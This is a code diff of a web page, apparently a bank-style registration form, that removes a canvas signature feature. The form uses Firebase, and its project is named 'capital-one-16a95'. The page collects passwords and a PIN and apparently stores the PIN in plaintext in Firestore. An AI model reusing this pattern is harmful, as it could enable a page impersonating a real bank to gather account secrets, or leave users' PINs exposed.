@@ -30,7 +30,6 @@
   .small-inputs input, .small-inputs select { flex: 1; }
   .radio-group { display: flex; gap: 15px; margin-top: 5px; }
   .checkbox-group { margin-top: 10px; }
-  .signature { border: 1px solid #ccc; height: 100px; margin-top: 5px; width: 100%; }
   button {
     margin-top: 20px; background: #002868; color: white;
     padding: 12px; border: none; border-radius: 6px; width: 100%;
@@ -136,8 +135,8 @@
     <h3>Profile Picture</h3>
     <input type="file" id="profilePic" name="profilePic" accept="image/*" required>
 
-    <!-- Terms & Signature -->
-    <h3>Terms & Signature</h3>
+    <!-- Terms -->
+    <h3>Terms & Conditions</h3>
     <div class="checkbox-group">
       <label><input type="checkbox" required> I agree to <a href="#">terms & conditions</a></label>
     </div>
@@ -145,10 +144,8 @@
     <label>Date</label>
     <input type="date" name="signDate" required>
     
-    <label>Primary Owner Signature</label>
-    <canvas class="signature" id="signature"></canvas>
-    
-    <button type="submit">Submit</button>
+    <!-- Register button -->
+    <button type="submit">Register Now</button>
   </form>
 </div>
 
@@ -159,7 +156,7 @@
   import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
   import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-storage.js";
 
-  // Your Firebase config
+  // Firebase config
   const firebaseConfig = {
     apiKey: "AIzaSyCfQGrLEYcNfmYid8XvigP5ZXJh1RNoipM",
     authDomain: "capital-one-16a95.firebaseapp.com",
@@ -174,26 +171,6 @@
   const db = getFirestore(app);
   const storage = getStorage(app);
 
-  // Signature capture
-  const canvas = document.getElementById("signature");
-  const ctx = canvas.getContext("2d");
-  let drawing = false;
-
-  canvas.addEventListener("mousedown", () => { drawing = true; });
-  canvas.addEventListener("mouseup", () => { drawing = false; ctx.beginPath(); });
-  canvas.addEventListener("mousemove", draw);
-
-  function draw(e) {
-    if (!drawing) return;
-    ctx.lineWidth = 2;
-    ctx.lineCap = "round";
-    ctx.strokeStyle = "black";
-    ctx.lineTo(e.offsetX, e.offsetY);
-    ctx.stroke();
-    ctx.beginPath();
-    ctx.moveTo(e.offsetX, e.offsetY);
-  }
-
   // Handle form submit
   document.getElementById("bankForm").addEventListener("submit", async function(e) {
     e.preventDefault();
@@ -206,9 +183,6 @@
       // Register user with Firebase Auth
       const userCred = await createUserWithEmailAndPassword(auth, email, password);
       const uid = userCred.user.uid;
-
-      // Capture signature
-      const signatureData = canvas.toDataURL("image/png");
 
       // Collect form data
       const formData = new FormData(this);
@@ -229,7 +203,6 @@
         ...data,
         pin,
         photoURL,
-        signature: signatureData,
         timestamp: new Date()
       });
 
@@ -244,4 +217,4 @@
 </script>
 
 </body>
-        </html>
+</html>
